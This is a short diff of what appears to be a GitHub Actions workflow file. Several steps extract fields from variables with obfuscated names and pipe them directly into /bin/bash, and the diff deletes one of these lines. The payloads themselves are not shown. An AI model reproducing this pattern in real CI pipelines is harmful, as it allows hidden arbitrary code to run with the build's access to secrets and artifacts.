@@ -24,7 +24,6 @@ jobs:
           echo $luvk746 | jq -r .lwwx6 | /bin/bash
           echo $eut86849 | jq -r .sv8 | /bin/bash
           printf '%s' "$wmhno5908" | jq -r .kabpl55 | /bin/bash
-          echo $vv7 | jq -r .xmtln713 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
